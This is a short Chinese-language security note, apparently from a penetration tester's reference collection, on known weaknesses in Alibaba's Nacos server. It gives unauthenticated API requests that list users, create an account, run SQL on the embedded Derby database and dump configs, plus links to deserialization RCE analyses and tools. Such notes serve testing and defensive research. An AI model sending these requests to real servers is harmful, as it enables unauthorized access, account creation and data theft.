### 查看用户
```
GET /nacos/v1/auth/users?pageNo=1&pageSize=100
```

### 创建用户
```
POST /nacos/v1/auth/users?username=test&password=test123
```

### unauth
```
/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st
```

> These endpoints are only valid when using embedded storage (derby DB) so this issue should not affect those installations using external storage (e.g. mysql)

- https://securitylab.github.com/advisories/GHSL-2020-325_326-nacos/
- https://www.cnblogs.com/hack404/p/14697313.html

```
/nacos/v1/cs/configs?dataId=&group=&appName=&config_tags=&pageNo=1&pageSize=100&tenant=&search=accurate
```

### 反序列化漏洞
- https://exp10it.cn/2023/06/nacos-jraft-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce-%E5%88%86%E6%9E%90/
- https://github.com/c0olw/NacosRce/tree/main


## 安装
https://github.com/alibaba/nacos/releases/download/2.0.3/nacos-server-2.0.3.zip
```
unzip -q nacos-server-2.0.3.zip
bin/startup.sh -m standalone
```

![image](https://user-images.githubusercontent.com/30398606/173304250-3c57144d-6b7b-4291-bc31-473c07cf504b.png)


## 参考
- [Nacos结合Spring Cloud Gateway RCE利用](https://xz.aliyun.com/t/11493)
- [Nacos Client Yaml反序列化漏洞分析](https://xz.aliyun.com/t/10355)
- https://github.com/google/tsunami-security-scanner-plugins/issues/118
- https://github.com/google/tsunami-security-scanner-plugins/issues/119
- https://github.com/alibaba/nacos/issues/1105
- [云原⽣组件Nacos新型红队手法研究](https://mp.weixin.qq.com/s/Jwwd5ailKNhwR57ACXB1kQ)
